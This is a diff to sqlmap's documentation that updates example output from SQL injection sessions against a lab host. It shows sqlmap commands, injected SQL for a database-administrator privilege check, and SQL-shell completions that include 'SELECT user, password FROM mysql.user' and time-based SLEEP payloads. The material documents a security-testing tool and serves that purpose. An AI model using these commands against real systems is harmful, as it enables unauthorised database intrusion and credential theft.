@@ -2567,13 +2567,12 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --is-
 [...]
 back-end DBMS: PostgreSQL
 
-[hh:mm:52] [INFO] testing if current user is DBA
-[hh:mm:52] [INFO] query: SELECT (CASE WHEN ((SELECT usesuper=true FROM pg_user WHERE 
-usename=CURRENT_USER OFFSET 0 LIMIT 1)=CHR(116)||CHR(114)||CHR(117)||CHR(101)) THEN 1 
-ELSE 0 END)
-[hh:mm:52] [INFO] retrieved: 
-[hh:mm:52] [INFO] performed 6 queries in 0 seconds
-current user is DBA:    'False'
+[hh:mm:49] [INFO] testing if current user is DBA
+[hh:mm:49] [INFO] query: SELECT (CASE WHEN ((SELECT usesuper=true FROM pg_user WHERE 
+usename=CURRENT_USER OFFSET 0 LIMIT 1)) THEN 1 ELSE 0 END)
+[hh:mm:49] [INFO] retrieved: 1
+[hh:mm:50] [INFO] performed 13 queries in 0 seconds
+current user is DBA:    'True'
 </verb></tscreen>
 
 <p>
@@ -3612,6 +3611,8 @@ Example of TAB completion on a <bf>MySQL 5.0.67</bf> target:
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int.php?id=1" --sql-shell -v 0
 
 sql> [TAB TAB]
+ LIMIT 
+(SELECT super_priv FROM mysql.user WHERE user=(SUBSTRING_INDEX(CURRENT_USER(), '@', 1)) LIMIT 0, 1)='Y'
 AND ORD(MID((%s), %d, 1)) > %d
 CAST(%s AS CHAR(10000))
 COUNT(%s)
@@ -3623,14 +3624,16 @@ LIMIT %d, %d
 MID((%s), %d, %d)
 ORDER BY %s ASC
 SELECT %s FROM %s.%s
-SELECT column_name, column_type FROM information_schema.COLUMNS WHERE table_name='%s' AND 
-table_schema='%s'
+SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)
+SELECT column_name, column_type FROM information_schema.COLUMNS WHERE table_name='%s' AND table_schema='%s'
 SELECT grantee FROM information_schema.USER_PRIVILEGES
 SELECT grantee, privilege_type FROM information_schema.USER_PRIVILEGES
 SELECT schema_name FROM information_schema.SCHEMATA
 SELECT table_schema, table_name FROM information_schema.TABLES
 SELECT user, password FROM mysql.user
+SLEEP(%d)
 VERSION()
+\s+LIMIT\s+([\d]+)\s*\,\s*([\d]+)
 sql> SE[TAB]
 sql> SELECT
 </verb></tscreen>
@@ -3676,7 +3679,7 @@ table_schema=CHAR(116,101,115,116) LIMIT 2, 1
 [hh:mm:48] [INFO] retrieved: surname
 [hh:mm:48] [INFO] performed 55 queries in 0 seconds
 [hh:mm:48] [INFO] the query with column names is: SELECT id, name, surname FROM test.users
-[hh:mm:48] [INPUT] does the SQL query that you provide might return multiple entries? [Y/n] y
+[hh:mm:48] [INPUT] can the SQL query provided return multiple entries? [Y/n] y
 [hh:mm:04] [INFO] query: SELECT IFNULL(CAST(COUNT(id) AS CHAR(10000)), CHAR(32)) FROM test.users
 [hh:mm:04] [INFO] retrieved: 5
 [hh:mm:04] [INFO] performed 13 queries in 0 seconds
